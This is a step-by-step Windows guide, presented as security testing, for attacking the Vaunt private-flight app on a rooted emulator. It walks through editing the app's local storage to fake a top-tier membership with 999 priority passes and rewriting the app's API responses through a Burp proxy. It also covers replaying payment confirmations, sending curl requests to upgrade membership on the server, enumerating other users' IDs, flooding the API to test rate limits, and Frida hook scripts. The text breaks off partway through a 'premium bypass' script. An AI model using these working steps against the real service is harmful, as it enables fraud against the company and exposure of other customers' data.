# Vaunt Flight App - MSI App Player Testing Guide (Windows)

**Platform:** MSI App Player on Windows
**Date Created:** November 3, 2025
**Target App:** com.volato.vaunt (Vaunt Flight App)
**Status:** Ready for Testing

---

## Table of Contents

1. [Prerequisites & Setup](#prerequisites--setup)
2. [MSI App Player Configuration](#msi-app-player-configuration)
3. [Installing Required Tools](#installing-required-tools)
4. [Test Environment Setup](#test-environment-setup)
5. [Test Scenarios](#test-scenarios)
6. [Troubleshooting](#troubleshooting)
7. [Quick Reference](#quick-reference)

---

## Prerequisites & Setup

### What You Need

**Software Requirements:**
- ✅ Windows 10/11 (64-bit)
- ✅ MSI App Player installed
- ✅ Administrator access on Windows
- ✅ At least 8GB RAM
- ✅ 20GB free disk space

**Tools to Download:**
1. **ADB (Android Debug Bridge)** - For emulator interaction
2. **Burp Suite Community Edition** - For traffic interception
3. **Frida** - For runtime manipulation (optional but recommended)
4. **DB Browser for SQLite** - For viewing AsyncStorage databases
5. **Notepad++** or **VS Code** - For viewing/editing files

### File Locations

**APK Location:**
```
\\wsl$\Ubuntu\home\runner\workspace\uploads\Vaunt.xapk
```

Or if you have it locally on Windows:
```
C:\Users\YourUsername\Downloads\Vaunt.xapk
```

**Important Note:** The `.xapk` file is actually a ZIP archive. You'll need to extract the main APK from it.

---

## MSI App Player Configuration

### Step 1: Launch MSI App Player

1. **Open MSI App Player**
   - Start Menu → MSI App Player
   - Wait for it to fully load

2. **Enable Developer Options:**
   - Click the gear icon (⚙️) or hamburger menu in MSI App Player
   - Go to **Settings**
   - Enable **Root Mode** (if available)
   - Enable **USB Debugging**
   - Enable **ADB Debugging**

3. **Configure Emulator Settings:**
   - **RAM:** Allocate at least 4GB
   - **CPU Cores:** 2-4 cores
   - **Resolution:** 1080x1920 (Phone)
   - **Android Version:** Check current version (ideally Android 7+)

### Step 2: Check if Root is Enabled

1. Install a root checker app or check manually:
   ```
   Settings → About Tablet → Tap Build Number 7 times
   Settings → Developer Options → Check if Root Access is available
   ```

2. If MSI App Player doesn't have root by default, you may need to:
   - Use a rooted version of MSI App Player
   - Or use alternative emulators (NoxPlayer, LDPlayer) that support root

---

## Installing Required Tools

### Tool 1: ADB (Android Debug Bridge)

**Download & Install:**

1. **Download Android Platform Tools:**
   - Visit: https://developer.android.com/studio/releases/platform-tools
   - Download "SDK Platform-Tools for Windows"
   - Extract to: `C:\platform-tools\`

2. **Add ADB to PATH:**

   **Method 1 (Command Prompt):**
   ```batch
   setx PATH "%PATH%;C:\platform-tools" /M
   ```

   **Method 2 (GUI):**
   - Right-click **This PC** → **Properties**
   - Click **Advanced system settings**
   - Click **Environment Variables**
   - Under **System variables**, find **Path**
   - Click **Edit** → **New**
   - Add: `C:\platform-tools`
   - Click **OK** on all dialogs
   - **Restart Command Prompt**

3. **Verify ADB Installation:**
   ```batch
   adb version
   ```

   You should see something like:
   ```
   Android Debug Bridge version 1.0.41
   ```

### Tool 2: Burp Suite Community Edition

**Download & Install:**

1. **Download:**
   - Visit: https://portswigger.net/burp/communitydownload
   - Download Windows installer
   - Run installer (requires Java JRE)

2. **Install Java (if needed):**
   - Download from: https://www.java.com/en/download/
   - Install and restart

3. **Launch Burp Suite:**
   - Start Menu → Burp Suite Community Edition
   - Choose "Temporary project" → "Use Burp defaults" → Start

### Tool 3: DB Browser for SQLite

**Download & Install:**

1. **Download:**
   - Visit: https://sqlitebrowser.org/dl/
   - Download Windows installer (Standard installer)

2. **Install:**
   - Run installer
   - Default options are fine

### Tool 4: Frida (Optional - Advanced Testing)

**Install Python First:**

1. **Download Python:**
   - Visit: https://www.python.org/downloads/
   - Download Python 3.11+ for Windows
   - **IMPORTANT:** Check "Add Python to PATH" during installation

2. **Install Frida:**
   ```batch
   pip install frida-tools
   ```

3. **Download Frida Server for Android:**
   - Visit: https://github.com/frida/frida/releases
   - Download: `frida-server-[version]-android-x86.xz` (for emulator)
   - Extract using 7-Zip to get `frida-server`

---

## Test Environment Setup

### Setup 1: Connect ADB to MSI App Player

**Find MSI App Player ADB Port:**

MSI App Player typically uses port `5555` or `5037`. Let's find it:

1. **Open Command Prompt as Administrator:**
   - Press `Win + X`
   - Select **Command Prompt (Admin)** or **PowerShell (Admin)**

2. **Check running emulators:**
   ```batch
   adb devices
   ```

3. **If no devices found, connect manually:**
   ```batch
   adb connect 127.0.0.1:5555
   ```

   If that doesn't work, try:
   ```batch
   adb connect 127.0.0.1:21503
   ```

4. **Verify connection:**
   ```batch
   adb devices
   ```

   You should see:
   ```
   List of devices attached
   127.0.0.1:5555    device
   ```

**Troubleshooting Connection:**
- If "device unauthorized": Check emulator for permission popup
- If "connection refused": Try different ports (5555, 5556, 5554, 21503)
- If still failing: Restart MSI App Player and try again

### Setup 2: Extract and Install the APK

**Extract the XAPK file:**

1. **Rename and extract:**
   ```batch
   cd C:\Users\YourUsername\Downloads
   ren Vaunt.xapk Vaunt.zip
   ```

2. **Extract the ZIP:**
   - Right-click `Vaunt.zip` → **Extract All**
   - Or use 7-Zip

3. **Find the main APK:**
   - Look for `com.volato.vaunt.apk` or similar
   - Usually the largest APK file

**Install APK via ADB:**

```batch
cd C:\Users\YourUsername\Downloads\Vaunt_extracted
adb install com.volato.vaunt.apk
```

Or **install via MSI App Player:**
- Open MSI App Player
- Click "Install APK" button
- Browse to the APK file
- Wait for installation

**Verify Installation:**
```batch
adb shell pm list packages | findstr vaunt
```

Should show:
```
package:com.volato.vaunt
```

### Setup 3: Configure Burp Suite Proxy

**Configure Burp Suite:**

1. **Launch Burp Suite**

2. **Set up Proxy Listener:**
   - Go to **Proxy** tab → **Options**
   - Under **Proxy Listeners**, click **Add**
   - **Bind to port:** `8080`
   - **Bind to address:** All interfaces
   - Click **OK**

3. **Export CA Certificate:**
   - Go to **Proxy** → **Options** → **Import / export CA certificate**
   - **Export** → **Certificate in DER format**
   - Save as: `C:\burp-cert.cer`

**Configure MSI App Player Proxy:**

1. **Get Your Windows IP Address:**
   ```batch
   ipconfig
   ```

   Look for your local IP (usually `192.168.x.x`)
   Example: `192.168.1.100`

2. **Set Proxy in Emulator:**

   **Method 1 (Via ADB):**
   ```batch
   adb shell settings put global http_proxy 192.168.1.100:8080
   ```

   **Method 2 (Via Emulator UI):**
   - In MSI App Player: **Settings** → **Wi-Fi**
   - Long press the connected Wi-Fi
   - Select **Modify network**
   - Expand **Advanced options**
   - **Proxy:** Manual
   - **Proxy hostname:** Your Windows IP (e.g., `192.168.1.100`)
   - **Proxy port:** `8080`
   - Save

3. **Install Burp Certificate on Emulator:**

   **Push certificate to emulator:**
   ```batch
   adb push C:\burp-cert.cer /sdcard/Download/burp-cert.cer
   ```

   **Install via emulator:**
   - In MSI App Player: **Settings** → **Security** → **Install from SD card**
   - Navigate to **Download** folder
   - Select `burp-cert.cer`
   - Give it a name: `Burp Suite`
   - Click **OK**

4. **Verify Proxy is Working:**
   - Open Chrome in the emulator
   - Visit: http://burpsuite
   - You should see Burp Suite homepage
   - Check Burp Suite → Proxy → HTTP history for requests

### Setup 4: Enable Root Access

**Check Root Status:**
```batch
adb shell
su
```

If you see `#` prompt, you have root access! 🎉

If you see "su: not found", MSI App Player may not have root enabled:

**Enable Root in MSI App Player:**
1. Close MSI App Player completely
2. Open MSI App Player settings (before starting emulator)
3. Look for "Root mode" or "SuperUser" option
4. Enable it
5. Start emulator

**Alternative: Install SuperSU (if needed):**
- Download SuperSU APK
- Install via `adb install SuperSU.apk`
- Open SuperSU app and enable root

---

## Test Scenarios

## TEST 1: AsyncStorage Data Inspection & Manipulation

**Objective:** Access and modify app's local storage to change membership status.

**Difficulty:** ⭐⭐ (Moderate)

---

### STEP 1: Install and Launch the App

```batch
# Install if not already installed
adb install com.volato.vaunt.apk

# Launch the app
adb shell monkey -p com.volato.vaunt -c android.intent.category.LAUNCHER 1
```

**Or manually:**
- Open MSI App Player
- Click on Vaunt app icon
- Complete registration/login (use a test account)

---

### STEP 2: Locate AsyncStorage Files

**Open ADB Shell:**
```batch
adb shell
```

**Switch to root (if available):**
```bash
su
```

**Navigate to app data directory:**
```bash
cd /data/data/com.volato.vaunt/
ls -la
```

**Find AsyncStorage database:**

React Native AsyncStorage can be in several locations:

```bash
# Option 1: Databases folder
ls -la /data/data/com.volato.vaunt/databases/

# Option 2: Files folder
ls -la /data/data/com.volato.vaunt/files/

# Option 3: Shared preferences
ls -la /data/data/com.volato.vaunt/shared_prefs/

# Look for files named:
# - RKStorage
# - AsyncStorage
# - ReactNativeAsyncStorage
```

**Common locations:**
```bash
/data/data/com.volato.vaunt/databases/RKStorage
/data/data/com.volato.vaunt/databases/AsyncStorage.db
```

---

### STEP 3: Pull the Storage Files to Windows

**Exit the ADB shell:**
```bash
exit
exit
```

**Create a folder on Windows to store files:**
```batch
mkdir C:\VauntTesting
cd C:\VauntTesting
```

**Pull the database files:**
```batch
adb pull /data/data/com.volato.vaunt/databases/ C:\VauntTesting\databases
```

**Or pull specific file:**
```batch
adb pull /data/data/com.volato.vaunt/databases/RKStorage C:\VauntTesting\RKStorage
```

**Pull shared preferences too:**
```batch
adb pull /data/data/com.volato.vaunt/shared_prefs/ C:\VauntTesting\shared_prefs
```

---

### STEP 4: Inspect the Data

**Open DB Browser for SQLite:**
- Start Menu → DB Browser for SQLite
- Click **Open Database**
- Navigate to `C:\VauntTesting\databases\RKStorage`
- Or if it's a different file, open `AsyncStorage.db`

**View the data:**
- Click **Browse Data** tab
- Select table: `catalystLocalStorage` (most common)
- You should see columns: `key`, `value`

**Look for sensitive keys:**

Search for keys containing:
- `user`
- `auth`
- `token`
- `membership`
- `subscription`
- `premium`
- `cabin`
- `priority`
- `pass`

**Example data you might find:**
```json
Key: @UserData
Value: {"id":"12345","email":"test@test.com","membershipLevel":"core","subscriptionStatus":"inactive"}

Key: @MembershipInfo
Value: {"tier":"core","expiresAt":"2025-01-01","priorityPasses":0}
```

**Document all sensitive data found!**

---

### STEP 5: Modify the Data

**In DB Browser for SQLite:**

1. **Find the membership row:**
   - Look for key containing `membership` or `subscription`

2. **Edit the value:**
   - Double-click the `value` cell
   - Modify the JSON:

   **BEFORE:**
   ```json
   {"membershipLevel":"core","subscriptionStatus":"inactive","priorityPasses":0,"expiresAt":"2025-01-01"}
   ```

   **AFTER:**
   ```json
   {"membershipLevel":"cabin_plus","subscriptionStatus":"active","priorityPasses":999,"expiresAt":"2099-12-31"}
   ```

3. **Save changes:**
   - Click **Write Changes** button (disk icon)
   - Confirm

---

### STEP 6: Push Modified Data Back to Emulator

**Stop the Vaunt app first:**
```batch
adb shell am force-stop com.volato.vaunt
```

**Push the modified database:**
```batch
adb push C:\VauntTesting\RKStorage /data/data/com.volato.vaunt/databases/RKStorage
```

**Fix permissions (important!):**
```batch
adb shell
su
chmod 660 /data/data/com.volato.vaunt/databases/RKStorage
chown u0_a123:u0_a123 /data/data/com.volato.vaunt/databases/RKStorage
exit
exit
```

**Note:** The `u0_a123` will vary. To find the correct owner:
```batch
adb shell ls -la /data/data/com.volato.vaunt/databases/
```
Look at the owner of other files and use the same.

---

### STEP 7: Test the Exploit

**Clear app cache (optional but recommended):**
```batch
adb shell pm clear com.volato.vaunt
```

**Restart the app:**
```batch
adb shell monkey -p com.volato.vaunt -c android.intent.category.LAUNCHER 1
```

**Or manually restart from MSI App Player**

**Check if exploit worked:**

1. Open the app
2. Go to **Profile** or **Account Settings**
3. Check your membership status
4. Look for:
   - Membership tier showing "Cabin+" instead of "Core"
   - Subscription status showing "Active"
   - Priority passes showing 999
   - Access to premium features

**Try accessing premium features:**
- Try to book a flight with priority
- Try to select premium seats
- Check if "Cabin+ membership expires on 2099-12-31" appears

---

### STEP 8: Document Results

**Create a results file:**

```batch
notepad C:\VauntTesting\Test1_Results.txt
```

**Document:**
```
TEST 1: AsyncStorage Manipulation
Date: [Today's Date]
Tester: [Your Name]

RESULTS:
[ ] SUCCESS - Membership changed to Cabin+
[ ] SUCCESS - Priority passes increased to 999
[ ] SUCCESS - Premium features unlocked
[ ] PARTIAL - Some changes worked, some didn't
[ ] FAILED - No changes took effect

DETAILS:
- Original Membership: Core
- Modified Membership: Cabin+
- App accepted changes: YES/NO
- Premium features accessible: YES/NO

EVIDENCE:
- Screenshot 1: Original membership status
- Screenshot 2: Modified database
- Screenshot 3: New membership status after exploit

SEVERITY: CRITICAL
CWE: CWE-312 (Cleartext Storage of Sensitive Information)

NOTES:
[Add any additional observations]
```

---

### TEST 1 CHECKLIST

- [ ] MSI App Player running with root access
- [ ] Vaunt app installed and logged in
- [ ] ADB connected successfully
- [ ] Located AsyncStorage database files
- [ ] Pulled database to Windows
- [ ] Opened database in DB Browser for SQLite
- [ ] Identified sensitive keys (membership, subscription)
- [ ] Documented original values
- [ ] Modified membership to "cabin_plus"
- [ ] Modified subscription to "active"
- [ ] Modified priority passes to 999
- [ ] Saved changes to database
- [ ] Pushed modified database back to emulator
- [ ] Fixed file permissions
- [ ] Restarted the app
- [ ] Verified changes took effect
- [ ] Tested premium features
- [ ] Took screenshots as evidence
- [ ] Documented results

---

## TEST 2: Man-in-the-Middle (MITM) Attack

**Objective:** Intercept and modify API traffic between app and server.

**Difficulty:** ⭐⭐⭐ (Moderate-Advanced)

---

### STEP 1: Ensure Proxy is Configured

**Verify Burp Suite is running:**
- Check that Burp is listening on port 8080
- Go to **Proxy** → **Intercept** → Turn intercept **OFF** for now

**Verify emulator proxy:**
```batch
adb shell settings get global http_proxy
```

Should show: `192.168.x.x:8080`

If not set:
```batch
adb shell settings put global http_proxy YOUR_WINDOWS_IP:8080
```

**Verify certificate is installed:**
- In MSI App Player: **Settings** → **Security** → **Trusted credentials**
- Look for "Burp Suite" under **User** tab

---

### STEP 2: Clear App Data and Restart

**Clear app cache:**
```batch
adb shell pm clear com.volato.vaunt
```

**Launch the app:**
```batch
adb shell monkey -p com.volato.vaunt -c android.intent.category.LAUNCHER 1
```

---

### STEP 3: Capture Login Traffic

**In Burp Suite:**
- Go to **Proxy** → **HTTP history**
- Clear history (right-click → Delete all items)

**In the emulator:**
- Open Vaunt app
- Log in with your test account

**Watch Burp Suite:**
- Observe requests appearing in **HTTP history**
- Look for requests to:
  - Login endpoints: `/v1/auth/login`, `/v1/user/login`
  - User profile: `/v1/user/profile`, `/v1/user/me`
  - Membership: `/v1/membership/*`

**No traffic appearing?**

Troubleshooting:
1. Check proxy settings again
2. Try opening Chrome in emulator and visit http://burpsuite
3. Check Windows Firewall isn't blocking port 8080:
   ```batch
   netsh advfirewall firewall add rule name="Burp Proxy" dir=in action=allow protocol=TCP localport=8080
   ```
4. Restart MSI App Player

---

### STEP 4: Identify Key API Endpoints

**In Burp Suite → Proxy → HTTP history:**

Look for and document:

1. **Authentication endpoint:**
   ```
   POST https://api.vaunt.com/v1/auth/login
   ```

2. **User profile endpoint:**
   ```
   GET https://api.vaunt.com/v1/user/profile
   ```

3. **Membership status endpoint:**
   ```
   GET https://api.vaunt.com/v1/membership/status
   GET https://api.vaunt.com/v1/user/subscription
   ```

**Extract authentication token:**
- Find the login request
- Look at the response
- Find the auth token (usually in JSON response or headers):
   ```json
   {
     "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "user": {...}
   }
   ```
- **COPY THIS TOKEN** - you'll need it later

---

### STEP 5: Intercept and Modify Membership Response

**Enable intercept:**
- Burp Suite → **Proxy** → **Intercept** → Turn **ON**

**In the app:**
- Navigate to your **Profile** or **Account** page
- This should trigger a membership status API call

**In Burp Suite:**
- A request will be held in the **Intercept** tab
- Look for requests to:
  - `/v1/user/profile`
  - `/v1/membership/status`
  - `/v1/user/subscription`

**Forward requests until you see the RESPONSE:**
- Click **Forward** to let the request go through
- Wait for the response to come back
- The response will now be held in intercept

**Modify the response:**

**Original response might look like:**
```json
{
  "user": {
    "id": "12345",
    "email": "test@test.com",
    "membershipLevel": "core",
    "subscriptionStatus": "inactive",
    "priorityPasses": 0,
    "subscriptionExpiresAt": null
  }
}
```

**Change to:**
```json
{
  "user": {
    "id": "12345",
    "email": "test@test.com",
    "membershipLevel": "cabin_plus",
    "subscriptionStatus": "active",
    "priorityPasses": 999,
    "subscriptionExpiresAt": "2099-12-31T23:59:59Z"
  }
}
```

**Forward the modified response:**
- Click **Forward**

**Turn intercept OFF:**
- Burp Suite → **Proxy** → **Intercept** → Turn **OFF**

---

### STEP 6: Verify the Exploit

**In the app:**
- Check your profile page
- Look for membership tier change
- Check if premium features are now accessible

**If it worked:**
- Membership should show "Cabin+"
- Premium features should be unlocked
- Priority passes should show 999

**If it didn't work:**
- App might be doing additional client-side validation
- Try modifying multiple API responses
- Check if app caches the original response

---

### STEP 7: Test Persistent Access

**Close and reopen the app:**
- Does the premium status persist?
- Or does it revert after reopening?

**If it persists:**
- The app is caching the modified response (more vulnerable!)

**If it reverts:**
- Need to use Burp's **Match and Replace** feature for persistence

**Set up auto-modification (Burp Suite):**

1. Go to **Proxy** → **Options** → **Match and Replace**
2. Click **Add**
3. Configure:
   - **Type:** Response body
   - **Match:** `"membershipLevel":"core"`
   - **Replace:** `"membershipLevel":"cabin_plus"`
   - **Regex match:** Unchecked
   - Click **OK**

4. Add another rule:
   - **Type:** Response body
   - **Match:** `"subscriptionStatus":"inactive"`
   - **Replace:** `"subscriptionStatus":"active"`

5. Enable all rules

Now ALL responses will be automatically modified!

---

### STEP 8: Test Payment Flow Manipulation

**Navigate to booking/payment in the app:**

**Watch Burp Suite for:**
- Payment intent creation: `/v1/payment/intent`
- Payment confirmation: `/v1/payment/confirm`
- Stripe API calls: `https://api.stripe.com/*`

**Attempt to:**
1. Start a booking process
2. Select premium options (if available)
3. Proceed to payment

**Capture the payment response:**
- When payment confirmation comes back
- Save it in Burp: Right-click → **Save item**

**Test replay attack:**
- Try replaying the successful payment response
- See if app accepts it without actual payment

---

### STEP 9: Document All API Endpoints

**In Burp Suite:**
- Right-click in HTTP history → **Copy URLs**
- Paste into a text file

**Create endpoint documentation:**

```batch
notepad C:\VauntTesting\API_Endpoints.txt
```

**Format:**
```
VAUNT API ENDPOINTS DISCOVERED
================================

AUTHENTICATION:
POST https://api.vaunt.com/v1/auth/login
POST https://api.vaunt.com/v1/auth/register
POST https://api.vaunt.com/v1/auth/refresh

USER MANAGEMENT:
GET https://api.vaunt.com/v1/user/profile
PUT https://api.vaunt.com/v1/user/profile
GET https://api.vaunt.com/v1/user/subscription

MEMBERSHIP:
GET https://api.vaunt.com/v1/membership/status
POST https://api.vaunt.com/v1/membership/upgrade
GET https://api.vaunt.com/v1/membership/benefits

FLIGHTS:
GET https://api.vaunt.com/v1/flights/search
POST https://api.vaunt.com/v1/flights/book
GET https://api.vaunt.com/v1/flights/history

PAYMENTS:
POST https://api.vaunt.com/v1/payment/intent
POST https://api.vaunt.com/v1/payment/confirm
POST https://api.vaunt.com/v1/user/createApplePaySetupIntent

[Continue with all discovered endpoints...]
```

---

### STEP 10: Document Results

```batch
notepad C:\VauntTesting\Test2_Results.txt
```

**Document:**
```
TEST 2: Man-in-the-Middle Attack
Date: [Today's Date]
Tester: [Your Name]

RESULTS:
[ ] SUCCESS - Traffic intercepted successfully
[ ] SUCCESS - Modified responses accepted by app
[ ] SUCCESS - Premium access granted via MITM
[ ] PARTIAL - Some modifications worked
[ ] FAILED - Certificate pinning prevented MITM

CERTIFICATE PINNING:
[ ] NO PINNING DETECTED
[ ] PINNING PRESENT BUT BYPASSED
[ ] PINNING PRESENT AND BLOCKED MITM

API ENDPOINTS DISCOVERED: [Number]

CRITICAL FINDINGS:
1. No SSL certificate pinning
2. Modified membership responses accepted
3. Client trusts all server responses without validation
4. Payment flow vulnerable to manipulation

EXPLOITABLE ENDPOINTS:
- /v1/user/profile - Membership modification
- /v1/membership/status - Status manipulation
- /v1/payment/confirm - Payment replay potential

SEVERITY: CRITICAL
CWE: CWE-295 (Improper Certificate Validation)

EVIDENCE:
- Burp HTTP history saved
- Screenshots of modified responses
- API endpoint list
```

---

### TEST 2 CHECKLIST

- [ ] Burp Suite configured and listening on port 8080
- [ ] Emulator proxy configured to Windows IP
- [ ] Burp CA certificate installed on emulator
- [ ] Verified proxy working (visited http://burpsuite)
- [ ] Cleared app data and logged in fresh
- [ ] Captured login traffic in Burp
- [ ] Extracted authentication token
- [ ] Identified user profile API endpoint
- [ ] Identified membership status endpoint
- [ ] Intercepted membership response
- [ ] Modified membership to "cabin_plus"
- [ ] Forwarded modified response
- [ ] Verified premium access granted
- [ ] Tested persistence after app restart
- [ ] Set up Match and Replace rules for auto-modification
- [ ] Tested payment flow interception
- [ ] Documented all API endpoints
- [ ] Saved Burp project for evidence
- [ ] Took screenshots
- [ ] Documented results

---

## TEST 3: API Endpoint Testing with curl

**Objective:** Directly call APIs to test server-side validation.

**Difficulty:** ⭐⭐⭐ (Moderate-Advanced)

---

### STEP 1: Install curl on Windows

**Check if curl is already installed:**
```batch
curl --version
```

**If not installed:**
- Windows 10/11 usually has curl built-in
- Or download from: https://curl.se/windows/

---

### STEP 2: Extract API Token

**From Burp Suite (TEST 2):**
- Find the login response
- Copy the authentication token

**Or from AsyncStorage (TEST 1):**
```batch
adb shell
su
cd /data/data/com.volato.vaunt/databases/
sqlite3 RKStorage
SELECT * FROM catalystLocalStorage WHERE key LIKE '%token%';
.quit
exit
exit
```

**Save token to file:**
```batch
notepad C:\VauntTesting\auth_token.txt
```

Paste your token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NSIsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsImlhdCI6MTY5ODc4OTEyMywiZXhwIjoxNjk4ODc1NTIzfQ.abcdef123456...
```

---

### STEP 3: Test User Profile Endpoint

**Set variables:**
```batch
set TOKEN=your_token_here
set API_URL=https://api.vaunt.com
```

**Get user profile:**
```batch
curl -X GET "%API_URL%/v1/user/profile" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json"
```

**Save response:**
```batch
curl -X GET "%API_URL%/v1/user/profile" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  > C:\VauntTesting\profile_response.json
```

**View response:**
```batch
type C:\VauntTesting\profile_response.json
```

---

### STEP 4: Attempt to Modify Membership via API

**Test 1: Try to upgrade membership directly:**
```batch
curl -X POST "%API_URL%/v1/membership/upgrade" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  -d "{\"membershipLevel\":\"cabin_plus\",\"expiresAt\":\"2099-12-31\"}"
```

**Test 2: Try to update user profile with premium status:**
```batch
curl -X PUT "%API_URL%/v1/user/profile" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  -d "{\"membershipLevel\":\"cabin_plus\",\"subscriptionStatus\":\"active\"}"
```

**Test 3: Try to add priority passes:**
```batch
curl -X POST "%API_URL%/v1/user/priority-passes" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  -d "{\"passes\":999}"
```

**Document responses:**
- If `200 OK` → Endpoint is vulnerable!
- If `403 Forbidden` → Proper authorization in place
- If `400 Bad Request` → Check request format
- If `500 Server Error` → Might indicate validation issues

---

### STEP 5: Test Payment Endpoints

**Test payment intent creation:**
```batch
curl -X POST "%API_URL%/v1/user/createApplePaySetupIntent" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  -d "{\"amount\":0,\"currency\":\"USD\"}"
```

**Test payment confirmation (if you have a payment intent ID):**
```batch
curl -X POST "%API_URL%/v1/payment/confirm" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  -d "{\"paymentIntentId\":\"pi_test_123\",\"status\":\"succeeded\"}"
```

---

### STEP 6: Test for IDOR (Insecure Direct Object Reference)

**Get your own user ID from profile response**

**Try to access another user's profile:**
```batch
curl -X GET "%API_URL%/v1/user/12346" ^
  -H "Authorization: Bearer %TOKEN%"
```

**Try incrementing user IDs:**
```batch
for /L %i in (12340,1,12350) do (
  curl -s -X GET "%API_URL%/v1/user/%i" ^
    -H "Authorization: Bearer %TOKEN%" ^
    >> C:\VauntTesting\idor_test.txt
)
```

---

### STEP 7: Test for Rate Limiting

**Create a batch script:**
```batch
notepad C:\VauntTesting\rate_limit_test.bat
```

**Add:**
```batch
@echo off
set TOKEN=your_token_here
set API_URL=https://api.vaunt.com

echo Testing rate limiting...
for /L %%i in (1,1,100) do (
  echo Request %%i
  curl -s -X GET "%API_URL%/v1/user/profile" ^
    -H "Authorization: Bearer %TOKEN%" ^
    -o nul ^
    -w "%%{http_code}\n"
)
```

**Run:**
```batch
C:\VauntTesting\rate_limit_test.bat > C:\VauntTesting\rate_limit_results.txt
```

**Analyze:**
- If all 200s → No rate limiting
- If 429s appear → Rate limiting exists

---

### STEP 8: Document API Test Results

```batch
notepad C:\VauntTesting\Test3_Results.txt
```

```
TEST 3: API Endpoint Direct Testing
Date: [Today's Date]
Tester: [Your Name]

AUTHENTICATION:
Token Type: JWT / Bearer / Other
Token Expiration: [Time]
Token Extracted: SUCCESS / FAILED

PROFILE ENDPOINT:
GET /v1/user/profile: [Status Code]
Response Contains: membershipLevel, subscriptionStatus, etc.

MEMBERSHIP MODIFICATION:
POST /v1/membership/upgrade: [Status Code]
Result: VULNERABLE / PROTECTED

Priority Pass Addition:
POST /v1/user/priority-passes: [Status Code]
Result: VULNERABLE / PROTECTED

PAYMENT ENDPOINTS:
/v1/payment/intent: [Status Code]
/v1/payment/confirm: [Status Code]
Replay Attack Possible: YES / NO

IDOR VULNERABILITY:
Tested User IDs: 12340-12350
Unauthorized Access: YES / NO
Other Users' Data Exposed: YES / NO

RATE LIMITING:
Present: YES / NO
Limit: [Number of requests before blocking]

SEVERITY: [LOW/MEDIUM/HIGH/CRITICAL]
CWE: CWE-639 (Authorization Bypass)

RECOMMENDATIONS:
1. Implement server-side membership validation
2. Add request signing
3. Implement rate limiting
4. Fix IDOR vulnerabilities
```

---

### TEST 3 CHECKLIST

- [ ] curl installed and working
- [ ] Authentication token extracted
- [ ] Tested GET /v1/user/profile
- [ ] Attempted POST /v1/membership/upgrade
- [ ] Attempted PUT /v1/user/profile with premium status
- [ ] Tested priority pass addition endpoint
- [ ] Tested payment intent creation
- [ ] Tested payment confirmation endpoint
- [ ] Tested for IDOR vulnerabilities
- [ ] Tested rate limiting
- [ ] Documented all responses and status codes
- [ ] Saved API test results

---

## TEST 4: Runtime Manipulation with Frida (Advanced)

**Objective:** Hook into app functions at runtime to bypass checks.

**Difficulty:** ⭐⭐⭐⭐ (Advanced)

---

### STEP 1: Set Up Frida Server on Emulator

**Find your CPU architecture:**
```batch
adb shell getprop ro.product.cpu.abi
```

Likely result: `x86` or `x86_64` (for emulator)

**Download Frida Server:**
- Visit: https://github.com/frida/frida/releases
- Download: `frida-server-[version]-android-x86.xz` (or x86_64)
- Extract with 7-Zip to get `frida-server`

**Push Frida Server to emulator:**
```batch
adb push C:\Downloads\frida-server /data/local/tmp/frida-server
```

**Make it executable:**
```batch
adb shell chmod 755 /data/local/tmp/frida-server
```

**Start Frida Server:**
```batch
adb shell
su
/data/local/tmp/frida-server &
```

Leave this running in the background.

**Open a new Command Prompt and verify:**
```batch
frida-ps -U
```

You should see a list of running processes on the emulator.

---

### STEP 2: List Running Processes

```batch
frida-ps -U | findstr vaunt
```

Should show:
```
12345  com.volato.vaunt
```

**If app isn't running, start it:**
```batch
adb shell monkey -p com.volato.vaunt -c android.intent.category.LAUNCHER 1
```

---

### STEP 3: Create AsyncStorage Monitoring Script

**Create Frida script:**
```batch
notepad C:\VauntTesting\frida_asyncstorage.js
```

**Add this code:**
```javascript
console.log("[*] Starting AsyncStorage Hook...");

Java.perform(function() {
    console.log("[*] Inside Java.perform");

    try {
        // Hook AsyncStorage - React Native Community version
        var AsyncStorageModule = Java.use('com.reactnativecommunity.asyncstorage.AsyncStorageModule');

        console.log("[+] Found AsyncStorage module!");

        // Hook getItem
        AsyncStorageModule.getItem.overload('java.lang.String', 'com.facebook.react.bridge.Callback').implementation = function(key, callback) {
            console.log("[AsyncStorage] getItem called");
            console.log("  Key: " + key);

            var result = this.getItem(key, callback);
            return result;
        };

        // Hook setItem
        AsyncStorageModule.setItem.overload('java.lang.String', 'java.lang.String', 'com.facebook.react.bridge.Callback').implementation = function(key, value, callback) {
            console.log("[AsyncStorage] setItem called");
            console.log("  Key: " + key);
            console.log("  Value: " + value);

            // Check for sensitive data
            if (key.toLowerCase().indexOf('membership') >= 0 ||
                key.toLowerCase().indexOf('subscription') >= 0 ||
                key.toLowerCase().indexOf('premium') >= 0 ||
                key.toLowerCase().indexOf('cabin') >= 0) {
                console.log("[!] SENSITIVE DATA DETECTED!");
                console.log("[!] Key: " + key);
                console.log("[!] Value: " + value);
            }

            var result = this.setItem(key, value, callback);
            return result;
        };

        console.log("[+] AsyncStorage hooks installed successfully!");

    } catch(err) {
        console.log("[-] Error: " + err);
    }
});
```

**Run the script:**
```batch
frida -U -l C:\VauntTesting\frida_asyncstorage.js com.volato.vaunt
```

**Use the app:**
- Log in
- Navigate around
- Watch your Command Prompt for logged AsyncStorage calls

---

### STEP 4: Create Membership Bypass Script

**Create new script:**
```batch
notepad C:\VauntTesting\frida_bypass_premium.js
```

**Add:**
```javascript
console.log("[*] Starting Premium Bypass Hook...");

Java.perform(function() {
    console.log("[*] Attempting to hook React Native methods...");

    try {
        // This is a generic approach - you'll need to adapt based on actual app structure
        // First, let's try to hook the ReactContext

        var ReactContext = Java.use('com.facebook.react.bridge.ReactContext');
        console.log("[+] Found ReactContext");

        // Try to intercept method calls that might check membership
        // Note: You'll need to identify the actual method names from app analysis

        // Hook JavaScript bridge to intercept membership checks
